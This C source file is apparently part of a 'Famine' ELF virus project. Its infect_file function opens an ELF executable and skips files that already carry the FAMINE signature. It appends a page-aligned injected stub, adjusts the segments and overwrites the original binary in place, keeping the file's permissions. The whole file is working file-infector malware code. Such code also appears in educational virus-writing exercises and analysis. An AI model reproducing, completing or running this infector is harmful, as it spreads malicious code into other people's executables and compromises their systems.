#include "../include/famine.h"

static void *mmalloc(size_t size) {
	void *ret = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (ret == MAP_FAILED) {
		return NULL;
	}
	return ret;
}

static void ffree(void *ptr, size_t size) {
	munmap(ptr, size);
}

int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
{
	t_famine	f;
	struct stat st;
	void		*map;
	int			fd;

	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return (LOG("open(%s) failed\n", path), 1);
	if (fstat(fd, &st) < 0 || st.st_size < (off_t)sizeof(Elf64_Ehdr))
		return (LOG("fstat/size check failed\n"), close(fd), 1);

	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (map == MAP_FAILED)
		return (LOG("mmap failed\n"), 1);
	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || memmem(map, st.st_size, FAMINE_SIG, sizeof(FAMINE_SIG) - 1))
		return (munmap(map, st.st_size), 1);

	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
	f.out_size = f.stub_offset + stub_len;
	f.out = mmalloc(f.out_size);
	if (!f.out)
		return (munmap(map, st.st_size), 1);
	memset(f.out, 0, f.out_size);
	memcpy(f.out, map, st.st_size);
	munmap(map, st.st_size);

	f.ehdr = (Elf64_Ehdr *)f.out;
	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
	if (find_segments(&f))
		return (ffree(f.out, f.out_size), 1);

	inject_stub(&f, stub, stub_len);

	fd = open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
	if (fd < 0)
		return (LOG("open(%s) for write failed\n", path), ffree(f.out, f.out_size), 1);
	if (write(fd, f.out, f.out_size) != (ssize_t)f.out_size)
		return (LOG("write failed\n"), close(fd), ffree(f.out, f.out_size), 1);
	close(fd);
	ffree(f.out, f.out_size);
	return (0);
}
